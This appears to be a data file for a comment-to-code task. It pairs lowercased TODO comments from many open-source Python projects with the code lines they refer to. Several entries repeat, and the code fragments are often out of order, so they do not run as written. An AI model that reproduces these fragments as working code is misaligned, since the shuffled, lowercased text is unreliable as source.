# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: find out why pls and cca fail. ransac is random </s> if name not in ('plscanonical', 'cca', 'ransacregressor'):	test_regressors_train regressor.fit(X, y_) regressor.predict(X) assert_greater(regressor.score(X, y_), 0.5) except Exception as e:
# todo: use upstream implementation when available </s> key_a, key_b = random.split(self._random_state)	beta_gen _support_mask = constraints.unit_interval def _rvs(self, a, b): gamma_a = standard_gamma(key_a, a, shape=self._size) gamma_b = standard_gamma(key_b, b, shape=self._size)
#doc [todo: get material from docstring of same method in assembly.py] </s> @note: the glname arg is permitted to be 0 or none, in which case we	dealloc_my_glselect_name def dealloc_my_glselect_name(self, obj, glname): do nothing, to make it easier for callers to implement repeatable destroy methods which forget their glname, or work if they never
# todo: should this piece of data be global instead of local to each buffer? </s> self.settings.vi['last_character_search'] = value	last_character_search @last_character_search.setter def last_character_search(self, value):
)  # todo </s> group_id, user_id, room_id, content,	add_room return self.transport_client.add_room_to_group(
# todo put this into the regression metric itself </s> cprediction = sanitize_array(prediction)	calculate_score else: if task_type in REGRESSION_TASKS: score = metric(solution, cprediction) else:
# todo: maybe foreginkyes should be taken from freeze orm </s> alter_foreignkey_to_int('recipes_oldrecipearticleredirect', 'new_id')	alter_self_foreignkeys alter_foreignkey_to_int('articles_articlecontents', 'article')
# todo check </s> if self.mimetype == 'application/x-id3':	format @interfacedoc def format(self): self.mimetype = 'audio/mpeg' return self.mimetype
# todo: remove </s> page_number = page_number or context["request"].get.get(page_var, 1)	paginator_autopaginate @register.assignment_tag(takes_context=True) def paginator_autopaginate(context, object_list, per_page=15, page_var='page', page_number=None): return paginate(object_list, per_page=per_page, page_number=page_number)
# todo: +kwargs </s> else:	push with rm.repo.git.custom_environment(**GitRepo.GIT_SSH_ENV): pi_list += rm.push(**push_kwargs) pi_list += rm.push(**push_kwargs) return pi_list
# todo: remove this line when counters are supported in build.py </s> raise invalidvalues	validate_content_list_token elif prototype in (('counter', ['IDENT']), ('counters', ['IDENT', 'STRING'])): args.append('decimal') return (name, args)
# todo proper error messages </s> result = {}	check_options def check_options(self, options): if options["System`Trace"].to_python(): result["TraceFn"] = print
# todo: remove check once pytorch avoids a copy for this case </s> if p.data_ptr() != p_data_fp32.data_ptr():	step p_data_fp32.add_(-group['weight_decay'] * group['lr'], p_data_fp32) p_data_fp32.add_(-update) p.data.copy_(p_data_fp32) return loss
# todo: cleanly remove clipboard code if it is no longer needed </s> return httpresponsebadrequest('not implemented anymore')	paste_clipboard_to_folder def paste_clipboard_to_folder(request): if True: if request.method == 'POST': folder = Folder.objects.get(id=request.POST.get('folder_id'))
# todo: udpoutgoing style buffer </s> data = dustpacket(addr, data)	send_to def send_to(data, addr): udp_socket.sendto(data, 0, addr)
# todo: really dirty. figure out a better way. </s> new_trades = [x for x in new_trades if x.identifier not in all_set]	query_location_trades only_cache=only_cache, ) location_trades.extend(new_trades) trades: TRADES_LIST = []
# todo proper error messages </s> result = {}	check_options def check_options(self, options): if options["System`Trace"].to_python(): result["TraceFn"] = print
# todo support multi-discrete actions </s> actions = torch.eye(self.body.action_dim)[actions.long()]	guard_q_actions def guard_q_actions(self, actions): if self.body.is_discrete: return actions
# todo: to be removed in v2.8.0 </s> if not use_backend_specific_templates:	render_to_template context_data = self.get_context_data() template = self.get_template() context_data['current_template'] = template.name return template.render(Context(context_data))
# todo: do_cert? </s> return data	run_sslyze weakest_dh = None data['config']['weakest_dh'] = weakest_dh
# todo: i'm not quite clear on the difference between </s> msg = read_sysex(infile, delta)	read_track msg = read_meta_message(infile, delta) elif status_byte in [0xf0, 0xf7]: else: msg = read_message(infile, status_byte, peek_data, delta, clip)
# todo: do data augmentation </s> image = _random_adjust_brightness(image, probability=0.3)	augmentation_for_train2 Returns: A preprocessed image. image = _random_adjust_contrast(image, 0.3)
# todo: approximate output size properly </s> curr_size = 101 + min(l_len, r_len) // 2	local_merge_new l_len = len(left_keys[0]) r_len = len(right_keys[0]) if is_left: curr_size = int(1.1 * l_len)
# todo: should allow multi_dimensional inputs/outputs </s> layer_sizes=(*scale_hidden_sizes, inputs.shape.as_list()[-1]),	scale_wrapper return feedforward_net( inputs, regularizer=tf.contrib.layers.l2_regularizer( self.scale_regularization))
end_tok = y.data[0, -1] # todo </s> if self.is_cuda:	infer Infer a likely output. No beam search yet. x, y = self.collate(*batch) x = x.cuda() t = y.cuda()
# todo this makes self variables non-breakable. wanted? </s> r = [n for n in par.get_set_vars()	process if details and details[0][0] != '=': no_break_scope = True if len(n) > 1 and str(n.names[-1] == name)] if isinstance(name, InstanceElement) and r:
# ensure_authorized_to('create', announcement) # todo: uncoment? </s> return respond()	new_announcement del form.id if request.method != 'POST': if not form.validate(): flash(gettext('Please correct the errors'), 'error')
# todo - add some tests to this response </s> response = self.do_list(	test_list } ) { 'items': [10, 11, 12],
# todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo: return return value </s> outputs.append(output(self))	doInput outputs = [] for output in transitioner.transition(methodInput): return outputs
# todo have no idea if is cdecl or stdcall </s> flag = params["processinformationclass"]	hook_ZwQueryInformationProcess }) def hook_ZwQueryInformationProcess(self, address, params): dst = params["ProcessInformation"] pt_res = params["ReturnLength"]
# todo: remove this line when the time is right. </s> paint_probationary_period_disclaimer(emitter)	grant if not label: label = click.prompt(f'Enter label to grant Bob {bob_verifying_key[:8]}', type=click.STRING) if not force and not expiration: if ALICE.duration_periods:
# todo : pytest.mark.parametrise once nose is gone. </s> def test_simplenamespace():	test_simplenamespace SN = types.SimpleNamespace sn_recursive = SN()
# todo: kernels need some sort of structured form </s> self.kernel_derivative = r_2_log_r_2_kernel_derivative	TPS kernel = r_2_log_r_2_kernel self.kernel = kernel self.K = self.kernel(pairwise_norms) self.P = np.concatenate(
pass # todo </s> def handle_request(self, input):	handle_request
##todo: not saving lines yet </s> if out_path is not none:	_evaluate_text_regressor metric.pred.extend(results) eval_loss /= len(sentences) with open(out_path, "w", encoding='utf-8') as outfile: outfile.write(''.join(lines))
# todo: check the data! </s> self.asserttrue(len(list(pipe)) > 0)	test_tail pipe_def = self._get_pipe_def(pipe_file) pipe = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def)
"""todo doc me""" </s> def parsetypes(table):	parsetypes
# @todo: remove this if in 0.6 </s> if isinstance(node_id, node):	ex_create_ip_group def ex_create_ip_group(self, group_name, node_id=None): node_id = node_id.id group_elm = ET.Element(
# @todo: display better tick labels for date range (e.g. 06/01 - 06/05) </s> formatter = matplotlib.dates.dateformatter('%h:%m')	show ax.xaxis.grid(False, 'major') ax.legend() ax.xaxis.set_major_formatter(formatter) ax.fmt_xdata = matplotlib.dates.DateFormatter('%H:%M')
# todo: implement </s> return true	eventFilter elif (ev.matches(QKeySequence.MoveToNextChar) or ev.matches(QKeySequence.MoveToPreviousChar)): self.popup().hide() return True
# todo: kickoff syncing process with this peer </s> self.logger.debug("peer's chain is ahead of us, start syncing with the peer.")	_compare_chain_tip_and_finalized_epoch (peer_has_equal_finalized_epoch and peer_has_higher_head_slot) ): pass
# todo: checks for being not outside of this repository </s> out.append(exists(target_path) and '.git/annex/objects' in target_path)	file_has_content if islink(filepath):                    # if symlink target_path = realpath(filepath)    # find abspath of node pointed to by symlink else: out.append(False)
# todo change affinity on osx/linux </s> if sys.platform == 'win32':	sitl_connect rate = os.environ.get('TEST_RATE', '200') sitl_args += ['--speedup', str(speedup), '-r', str(rate)] sitl = Popen(['start', '/affinity', '14', '/realtime', '/b', '/wait'] + sitl_args, shell=True, stdout=PIPE, stderr=PIPE) else:
# todo: this is lazy, we should only reconfigure the drone(s) who are actually </s> if drone_edge:	_handle_command_bait_user_changed drone_edge = db_session.query(DroneEdge).filter(DroneEdge.username == username, DroneEdge.password == password).first() self._reconfigure_all_clients()
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as _send:	test_search def test_search(self): _send.return_value = mock.Mock( status_code=200, headers={}, content=b'{}')
# todo: is incref required? </s> context.nrt.incref(builder, arr_typ, arr)	box_dataframe else: arr_obj = box_array(arr_typ, arr, c) pyapi.object_setitem(df_obj, cname_obj, arr_obj) pyapi.decref(cname_obj)
# todo enable when it will not crash </s> self.on_size_allocate(widget)	on_load_status_changed self._forward_button.set_sensitive(widget.can_go_forward())
# todo support startblock, endblock </s> self.handle_full_chaincode(block, cr)	_processChaincodeEvents else:
#time = "todo" </s> try:	fill_annotation annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO" #TODO f = open(lab_file, "r") except IOError:
# todo?: does not match two subsequent variables or strings, such as  "start" # foo # bar # "end"  or  "start" # "end". </s> return self.replace_all_re.sub(repl, val)	_string_subst_partial if '#' not in val: return val
# todo: kernels need some sort of structured form </s> self.kernel_derivative = r_2_log_r_2_kernel_derivative	TPS kernel = r_2_log_r_2_kernel self.kernel = kernel self.K = self.kernel(pairwise_norms) self.P = np.concatenate(
# todo: check types </s> return pandas_timestamp_type	typer def typer(year, month, day, hour, minute, second, us, ns):
# todo: delete this </s> stream_count = yield self.get_count_for_stream_hash(lbry_file.stream_hash)	delete_lbry_file yield self._delete_lbry_file_options(lbry_file.rowid) yield lbry_file.delete_data() if stream_count == 0: yield self.stream_info_manager.delete_stream(lbry_file.stream_hash)
# todo per-sync cached results </s> @classmethod	library def library(cls, media, marked, extended='min'): return Trakt.User.get_library(media, marked, extended).get('data')
# todo: hints </s> child = child or self.get_default_child()	golf escape=False): Either pass in regexp(s) desired from the output as a string or a list, or an md5sum of the output wanted. if expect_type == 'regexp': if type(expect) == str:
# todo: ... </s> dumpdata(get_dump_path('blog.txt'), data)	dump_channel def dump_channel(data):
# todo: reformat or delete </s> camera.trackbodyid = 0	sawyer_xyz_reacher_camera def sawyer_xyz_reacher_camera(camera): camera.distance = 1.0 cam_dist = 0.3
# todo: error handling? </s> session_obj.shutdown()	delete network='orchest', ) db.session.delete(session) db.session.commit()
# todo: remove in v2.8 </s> if hasattr(self.choiceset, 'legacy_map') and obj in self.choiceset.legacy_map:	ChoiceField ('label', self._choices[obj]) ]) data['id'] = self.choiceset.LEGACY_MAP.get(obj) return data
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
# todo: some streams were redirected, we need to manually work them </s> reattachconsole = false	elevateAdminRun reattachConsole and not all(stream.isatty() for stream in (sys.stdin, sys.stdout,sys.stderr))): executeInfo = ShellExecuteInfo(fMask=SEE_MASK_NOCLOSEPROCESS, hwnd=None, lpVerb='' if areAdminRightsElevated() else 'runas',
# todo: add pi_stack and cation_pi to feature_types (it's not trivial </s> feature_types=["ecfp", "splif", "hbond", "salt_bridge"],	__init__ self.featurizer = RdkitGridFeaturizer( voxel_width=16.0, ecfp_power=9, splif_power=9,
# todo: look at args for remotedata </s> workers = frequencies(w for dep in deps	add_key_to_queue deps = dependencies[key] yield [completed[dep].wait() for dep in deps]  # wait until dependencies finish for w in who_has[dep]) worker = min(workers, key=lambda w: len(stacks[w]))
# todo archive schema and return </s> pass	transform def transform():
# todo(sano): deal with maximize task. </s> return min(all_trials, key=lambda t: t.value)	get_best_trial if len(all_trials) == 0: raise ValueError('No trials are completed yet.')
# todo: will work only if table.fields is ordereddict </s> filename, fobj = get_filename_and_fobj(filename_or_fobj, mode='w')	export_to_txt def export_to_txt(table, filename_or_fobj, encoding='utf-8', *args, **kwargs): max_sizes = _max_column_sizes(table, encoding, *args, **kwargs) fields = table.fields.keys()
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: remove this when we depend on genshi >= 0.5 </s> return stream.render('text')	render_template if method == 'text': if arity(stream.render) == 3: else: buffer = cStringIO()
#todo could use original filename to verify this </s> assert_true(filename.endswith('.mp3'))  # depends on specific file	download_song_mm def download_song_mm(self): filename, audio = self.mm.download_song(self.song.sid) assert_is_not_none(audio)
# todo: this is ugly use of exceptions; is there a better way to track whether in a given type of request? </s> try:	get_cache_key Fetch a request key from either a Django or Flask request. Fall back on a process-global dummy object if we are not in either type of request return request._get_current_object() except RuntimeError:  # Not in a flask request context
# todo: check for error 'toomanyrules' </s> rule.conditions = conditions	modify_rule if action_target_group_arn not in target_group_arns: raise ActionTargetGroupNotFoundError(action_target_group_arn) rule.actions = actions return [rule]
# todo: valid and invalid values for the rest of the user model's fields. </s> helpers.call_action('user_update', **user)	test_user_update_with_null_password with nose.tools.assert_raises(logic.ValidationError) as context:
# todo: what should we do here, tell user the repo </s> continue	group_discuss repo = get_repo(att.repo_id) if not repo: att.name = repo.name else:
# todo: break this tuplet stuff into a helper function shared for <note>, <rest>, and <chord> </s> if elem.get('m21tupletsearch') is not none:	restFromElement if elem.get(_XMLID) is not None: post.id = elem.get(_XMLID) post.m21TupletSearch = elem.get('m21TupletSearch') post.m21TupletNum = elem.get('m21TupletNum')
# todo(dcramer): we want to be less aggressive on disabling domains </s> cache.set(domain_key, error or '', 300)	fetch_url logger.exception(unicode(exc)) error = ERR_UNKNOWN_INTERNAL_ERROR logger.warning('Disabling sources to %s for %ss', domain, 300, exc_info=True)
# todo: do i need this? </s> else:	get_cutting_plane_from_surface_elements iedges.append(iedge) p_planes.append(p_plane)
# todo: make sure values are actually adding/etc together! </s> assert isinstance(p + q, parameter)	test_parameter_right_literal_arithmetic @pytest.mark.parametrize("q", test_values) def test_parameter_right_literal_arithmetic(p, q): assert isinstance(p - q, Parameter) assert isinstance(p * q, Parameter)
# todo verify produced answer </s> cnv.forward(input_tensor).detach().numpy()	test_brevitas_trained_cnv_w1a1_pytorch assert input_tensor.shape == (1, 3, 32, 32)
# todo: for logs </s> log_loss = tf.identity(log_loss, name='log_loss')	rpn_cost labels_prob = tf.one_hot(labels, 2) log_loss = tf.losses.log_loss(labels_prob, cls_prob) self._losses['rpn_classification_loss'] = log_loss rpn_bbox_target = tf.reshape(rpn_bbox_target, [-1, 4])
fwd_from=none,  # todo select from the database </s> post_author=message[6],	get_lowest_message message=message[4], reply_to_msg_id=message[5], media=None  # TODO Select from the database
# todo remove once minimum required matplotlib version reaches 2.0 </s> if matplotlib_version < [2, 0]:	plot else: sharex = self.axis[0] axis_facecolor_kwargs = dict(axisbg=self.background_color) else:
# todo test this </s> raise usageerror(str(e))	parseArgs deployment_configuration=deployment_config) except ConfigurationError as e:
# todo: cleanup and deprecate worker_address in config files, leaving only checksum_address </s> federated = bool(config_class.peek(filepath=filepath, field='federated_only'))	extract_checksum_address_from_filepath default_name = config_class.generate_filename() if filename == default_name: if federated: checksum_address = config_class.peek(filepath=filepath, field='checksum_address')
# todo: remove once elasticsearch v6.x is deprecated. </s> if self._getclientmajorversion() < 7:	_FlushEvents 'index': self._index_name, 'request_timeout': self._DEFAULT_REQUEST_TIMEOUT} bulk_arguments['doc_type'] = self._document_type self._client.bulk(**bulk_arguments)
continue  # todo: log this </s> except typeerror:	load_extensions try: if not issubclass(extension_class, Extension): continue  # TODO: log that extension_class is not a class try:
return deserialize(self.mechanism_bin, from_bytes=true)  # todo: techdebt fix </s> @mechanism.setter	Ledger @property def mechanism(self) -> Any: def mechanism(self, value: Any) -> None: self.mechanism_bin = serialize(value, to_bytes=True)  # TODO: techdebt fix
# todo: ... </s> returns rows of dataelementid, categoryoptioncomboid, value and comment for this dataset	get_data_values def get_data_values(self, ucr_data):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_full_scan def test_full_scan(self): Scanning the Tangle for all transfers.
# todo: handle output diffing with plugins? </s> if key.lower().startswith(_split_mimes):	diff_mime_bundle avalue = a[key] bvalue = b[key] dd = diff(avalue, bvalue) if dd:
@unittest.skip('not written')  # todo: finish! </s> raise notimplementederror	test_file def test_file(self):
# xxx todo fix earley to maintain correct order </s> self.assertequal(set(res.children), {'aa', 'a'})	test_earley3 res = l.parse("aaa")
# todo: support ps fault-tolerance </s> raise runtimeerror(	get_model_from_ps res = stub.pull_variable(req) if not res.model_init_status: "PS pod %d cannot be initialized" % ps_id )
# todo: test me. </s> @motion.setter	motion def motion(self, name): self.settings.vi['motion'] = MOTION_TRANSLATION_TABLE.get((self.action, name), name)
# todo(yifanmai): merge _setup_if_needed into setup </s> return construct	_make_construct_fn return model_agnostic_wrapper
# todo(cmaloney): good exception catching, etc </s> def wsgi_app(env, start_response):	wsgi_app length = int(env['CONTENT_LENGTH']) data = env['wsgi.input'].read(length)
# todo: check if we can avoid py3 specific here </s> return "" if x is none else binary_type.decode(x)	decode_if_not_None def decode_if_not_None(x):
# todo: make this collection_type </s> collection_type = value["type"]	_run_jobs content = element_data["content"] elements.append( ( identifier, content ) ) if collection_type == "list:paired": hdca = self.dataset_collection_populator.create_list_of_pairs_in_history( history_id ).json()
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
raise exceptions.mpdnotimplemented  # todo </s> send a message to the specified channel.	sendmessage ``sendmessage {CHANNEL} {TEXT}``
# todo: dispatch on name to validate content (string, number, tuple) </s> yield (name, value[0] if len(value) == 1 else tuple(value))	parse_declarations state = VALUE elif token.type == "literal" and token.value == ";": state = NAME elif token.type == "whitespace":
# todo ... </s> data = sorted()	userLongDescription for key in mainKeys: data[key] = data.get(key, "").strip()
# todo: provide a kernel which will describe how coordinates are extruded. </s> mesh = firedrake.extrudedmesh(m, layers, layer_height=0.1)	identity_xtr m = UnitSquareMesh(2 ** power, 2 ** power) layers = 11 fs = firedrake.FunctionSpace(mesh, family, degree, name="fs") f = firedrake.Function(fs)
# todo(sbauza): the current placement noauthmiddleware returns a 401 </s> return self._client.get(	_fake_get def _fake_get(self, *args): (url,) = args[1:] url, endpoint_override="http://127.0.0.1:%s" % self.service.port,
# todo: add initialization </s> self.scoring_fct_norm = scoring_fct_norm	__init__ self.epsilon = nn.Parameter(torch.tensor(0.005, requires_grad=True))
# todo: make sure config exists in /etc </s> minerd_cmd = "sudo minerd -u nigel swirl+tcp://pool.pool2.21.co:21006/"	mine else: subprocess.call("sudo minerd --stop") try: o = subprocess.check_output(minerd_cmd, universal_newlines=True)
#todo - there could be room for both a responsiveness check and a valid </s> responsive_cause_index = none	_review_history tcp_valid = False udp_valid = False prev_index = None for i, retry in enumerate(self.history):
recording_uuid = none #todo </s> start_time_system_s = none  # todo	recording_update_pupil_mobile_to_pprf_2_0 def recording_update_pupil_mobile_to_pprf_2_0(rec_dir: str) -> RecordingInfoFile: info_csv = utils.read_info_csv_file(rec_dir) start_time_synced_s = None  # TODO duration_s = None  # TODO
return user.address  # todo: update </s> elif item == 'user_address':	get_user_info return user.address  # TODO: update elif item == 'user_country': return user.address  # TODO: update elif item == 'user_paid':
# todo: remove unescape_entities when mako html safe comes in </s> def unescape_entities(value):	unescape_entities Convert HTML-encoded data (stored in the database) to literal characters. Intended primarily for endpoints consumed by frameworks that handle their own escaping (eg Knockout)
# todo: remove this ``expectedfailure`` </s> self.assertlistequal(data3, [t1, t2])	test_successful_write_transaction data3 = list(Test.objects.all())
# update new uniqueid kodi 17 - todo get uniqueid_id for updates from embydb </s> if self.kodi_version > 16:	add_updateEpisode ratingid =  self.kodi_db.create_entry_rating() self.kodi_db.add_ratings(ratingid, showid, "episode", "default", rating, votecount) uniqueid =  self.kodi_db.create_entry_uniqueid() self.kodi_db.add_uniqueid(uniqueid, showid, "episode", tvdb, "tvdb")
# todo: look at the model to see which revision is last. </s> offset = url_for(controller='revision', action='list')	test_list_format_atom revision1 = revisions[0] try: res = self.app.get(offset + '?format=atom') print res
#todo check that fn is callable </s> wrapped = partial(fn, **opts)	dispatch else: pass update_wrapper(wrapped, fn) return wrapped
# todo-blocker (rtibbles): hook into unit settings/front end parameterization to replace '8'. </s> exercise["basepoints"] = settings.unit_points/(len(current_unit_exercises)*(8 + settings.fixed_block_exercises + settings.quiz_repeats))	exercise if exercise["exercise_id"] in current_unit_exercises: logging.debug("Setting basepoints" + str(current_unit)) else: exercise["basepoints"] = 0
# todo make this a private api </s> latitude = place.get('lat', none)	parse_code @staticmethod def parse_code(place): longitude = place.get('lon', None) placename = place.get('display_name', None)
# todo: adjust the childrenrect for axis, labels and legends </s> rect = self.childrenrect()	map_from_graph_cart min_x, max_x = self.data_range[axes[0]] min_y, max_y = self.data_range[axes[1]] rx = (px - rect.left()) / rect().width() * (max_x - min_x) ry = -(py - rect.bottom()) / rect.height() * (max_y - min_y)
# todo-me return object </s> return [[video.ratingkey] + [str(video.originallyavailableat)]]	sort_by_dates ad_week = int(datetime.date(ad_year, ad_month, ad_day).strftime("%V")) if ad_month == today.month and ad_day == today.day: except Exception as e: return
raise notimplementederror  # todo </s> def __init__(self, perturbation_function, steps, recompute_analysis=false):	__init__
# @todo: move this field from this core table </s> field("opt_in", "string", # list of mailing lists which link to teams	S3PersonModel writable = False, ), default=False, label = T("Receive updates"),
pass # todo </s> def handle_request(self, input):	handle_request
# @todo: remove these when we're certain that s3_get_foreign_key finds these properly </s> if not ktablename:	_resolve_references pkey, fkey = ("id", field) ktablename, key, multiple = s3_get_foreign_key(table[fkey]) if self.tablename == "auth_user": if fkey == "organisation_id":
# todo: exc_info. </s> future.set_exception(error)	_scan_callback def _scan_callback(self, future, command_cursors, error): if error: else: command_cursor_class = create_class_with_framework(
# todo: find a better random value </s> return datetime.datetime.now()	_auto_value def _auto_value(self, prop): if prop.type == datetime.datetime: elif prop.type == datetime.date: return datetime.date.today()
#todo change to native framework call, when plex allows token in header </s> urltoplaylists = misc.getloopback() + '/playlists'	COPY jsonItems[UUID].append(itemKey) try: opener = urllib2.build_opener(urllib2.HTTPHandler) request = urllib2.Request(urltoPlayLists)
# todo verify results </s> self.assertrequest(responsecode=200)	test_post_query_graphql_content content_type=b"application/graphql" )
# todo this is a bit jankey to be honest </s> if apps_changed:	ready settings.INSTALLED_APPS += [plugin_path] apps_changed = True apps.app_configs = OrderedDict() apps.apps_ready = apps.models_ready = apps.loading = apps.ready = False
# todo implement for all channels </s> return none	_handle_toggle def _handle_toggle(self, message):
# todo fix this </s> search_key = self.request_params.get("ssearch", "")	case_results results = self.paginator_results.get(self.pagination.start, self.pagination.count) else: query = "domain:(%s)" % self.domain query = "%s AND owner_id:(%s)" % (query, " OR ".join(self.case_owners))
# todo: refactor this method. </s> if event.cancelled:	_dispatcher def _dispatcher(self, event, channels, remaining):  # noqa return if event.complete:
# todo(crcrpar): support botorch v0.4.0. </s> "botorch<0.4.0 ; python_version>'3.6'",	get_extras_require "dask[dataframe]", "dask-ml", "fastai", "optax",
# todo: show message. </s> return false	restore if not self.zip_file or not self.meta_data or not self.meta_data.get("cura_release", None): Logger.log("w", "Tried to restore a Cura backup without having proper data or meta data.") version_data_dir = Resources.getDataStoragePath() archive = ZipFile(io.BytesIO(self.zip_file), "r")
# todo: send email here? </s> return response(json.dumps(response_data), content_type="application/json")	participate 'id' : p.id }
sage: k.pari_nf() # not tested # todo: pari-2.13.0 </s> [y^2 - 100000000000000000000...]	pari_nf a very long time without the ``maximize_at_primes`` option:: sage: K.<a> = NumberField(x^2 - p*q, maximize_at_primes=[p]) Since the discriminant is square-free, this also works:: sage: K.<a> = NumberField(x^2 - p*q, assume_disc_small=True)
# todo: must be implemented </s> self.app = app()	create_app def create_app(self): self.app.initialize() self.app.user_input = self.get_novel_url()
# todo: do we need to skip config.add_slack variable here? </s> var_filter = (lambda v: v[1].is_integer()) if discrete_only \	generate_norm2sq_objective_function discrete_only: Bool only optimize on distance between the discrete variables else (lambda v: v[1].name != 'MindtPy_utils.objective_value' and 'MindtPy_utils.MindtPy_feas.slack_var' not in v[1].name)
@jtu.skip_on_devices("tpu")  # todo(mattjj, pfau): fails on tpu. </s> def testlugradofsingularmatrix(self, corank):	testLuGradOfSingularMatrix {"testcase_name": "_corank={}".format(corank), "corank": corank} for corank in [1, 2])) def _lu(a): p, l, u = jsp.linalg.lu(a)
pass # todo </s> subcommand = config.default_action	run self.todolist = TodoList.TodoList(todofile.read()) except Exception: if len(sys.argv): subcommand = sys.argv[1]
# todo: add a named tuple/dict version </s> return "%s{%s}" % (struct.__class__.__name__, ", ".join(fields))	toString fields = [field + "=" + str(getattr(struct, field)) for (field, _) in struct._fields_]
# todo: check / store delta. </s> n_morph = none	extract_primitives v_morph = convert_swizzle_location(blender_shape_key.data[vertex_index].co) target_positions.append(v_morph) if blender_polygon.use_smooth: temp_normals = blender_shape_key.normals_vertex_get()
# todo also check for motion codec parameter support </s> return 'hevc_nvmpi' in codecs.get('hevc', {}).get('encoders', set())	has_hevc_nvmpi_support if not binary: return False
# todo: this check may hide a bug a should be removed. </s> if not check_date:	is_expired if now > check_date + (seconds+minutes+hours) True is returned, else False return False total_hours = (day * 24) + hours
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study(direction=direction)	test_plot_optimization_history return 0.0 return 0.0 study.optimize(objective, n_trials=3) figure = plot_optimization_history(study)
# todo need copy? </s> x = mesh.node_coords.copy()	quasi_newton_uniform2 and bad meshes. def get_new_points(mesh): omega = 2.0 x -= omega / 2 * (jac_uniform(mesh).reshape(-1, 2).T / mesh.control_volumes).T
return {} # todo </s> elif method == 'mining.get_temperature':	handle_event return "stratum-proxy/0.2" elif method == 'mining.get_hashrate': return {} # TODO else:
# todo: fixme-  assumes only one topic (next two lines) </s> self.context.currentnode = self.topology.sources[0]	process self.context.currentRecord = record self.current_timestamp = self.timestamp_extractor.extract(record, self.current_timestamp) self.topology.sources[0].process(record.key(), record.value()) self.consumedOffsets[(record.topic(), record.partition())] = record.offset()
# todo: test event is in response </s> self.response = self.client.get(reverse("api_occurences"),	test_occurences_api_works_with_and_without_cal_slug ) self.assertEqual(self.response.status_code, 200) {'start': '2008-01-05', 'end': '2008-02-05'}
# todo(philday): add support for timeout (clean shutdown) </s> return self._vmops.migrate_disk_and_power_off(context, instance,	migrate_disk_and_power_off timeout=0, retry_interval=0): off the instance copies over the COW disk dest, flavor, block_device_info)
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo set only zero order </s> vals = nm.repeat([fun], nods.shape[0] * dpn)	set_volume_dofs nods = nm.unique(nm.hstack(aux)) if nm.isscalar(fun): elif isinstance(fun, nm.ndarray): assert_(len(fun) == dpn)
"deaths": "",  # todo: fix </s> "notes": "",	parse_pdf "discarded": sum(row["discarded"] for row in result), "suspect": sum(row["suspect"] for row in result), "source_url": result[0]["source_url"], })
#todo: check for continous or discrete, only continuous supported right now </s> dico = 'c'	h2syn ======= K : controller to stabilize P D,V = np.linalg.eig(P.A) for e in D:
# todo: not actually sure this can ever happen. </s> self._ssl_want_write = true	recv raise RetryError except SSL.WantWriteError: debug("call: recv(), err: want-write", inst=self) raise RetryError
# todo: django 2.0: remove </s> return ''	get_short_name def get_short_name(self) -> str:
#        todo: need more info about log in procedure in game </s> else:	__login__ sku = 'FUT14AND' clientVersion = 8
# todo: this is repeated from flowdir </s> a = np.arange(dem.size)	detect_nondraining_flats ignore_metadata=ignore_metadata, metadata=metadata, **kwargs) dem_mask = np.where(dem.ravel() == nodata_in)[0] top = np.arange(dem.shape[1])[1:-1] left = np.arange(0, dem.size, dem.shape[1])
1  # todo: fill in identifier </s> ) # this will raise insufficient funds value error	test_netting second_direct_transfer0 = channel0.create_directtransfer( transfer_amount_failed, transfer_amount1 = 30 direct_transfer1 = channel1.create_directtransfer(
# todo: implement the shit herein instead of collectionrepo </s> self.repo.commit_collection(collection, self.branch, msg)	CollectionRepoBranchBackend return self.repo.get_collection(self.branch) def commit_collection(self, collection, msg):
# todo: test this </s> for chan in self.channels.values():	handle_error_code_from_failed_htlc if r == UpdateStatus.GOOD: self.logger.info(f"applied channel update to {short_channel_id}") if chan.short_channel_id == short_channel_id: chan.set_remote_update(payload['raw'])
# todo(yamahata): creating volume simultaneously </s> volume_api.wait_creation(context, vol['id'])	_setup_block_device_mapping vol = volume_api.create(context, bdm['volume_size'], bdm['snapshot_id'], '', '') self.db.block_device_mapping_update( context, bdm['id'], {'volume_id': vol['id']})
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_publish_add_remote def test_publish_add_remote(origin, src_path, dst_path): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") sub1 = GitRepo(opj(src_path, 'sub1'))
# todo: the orderer node url needs to be fixed. </s> orderer_url=ordering_node.urls,	create peer_channel_cli.create( channel=name, channel_tx=tx_path, orderer_tls_rootcert="{}/msp/tlscacerts/tlsca.{}-cert.pem".format(dir_certificate, org_domain))
# todo: fix clone issue </s> assert self.x_train.shape[0] > cof_.n_neighbors_	test_check_parameters cof_.fit(self.X_train)
#todo_ismeal_quesataion: i prefer get_* for getters </s> return self.__classical_registers[name]	classical_registers def classical_registers(self, name):
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# ^ todo: uncomment once federated ursula status pages work and remove skip (below) </s> @pytest.mark.skip("need to be changed to correctly use dash[testing] and only run on circleci")	test_render_lonely_ursula_status_page def test_render_lonely_ursula_status_page(dash_duo): ursula_config = UrsulaConfiguration(dev_mode=True, federated_only=True, known_nodes=list())
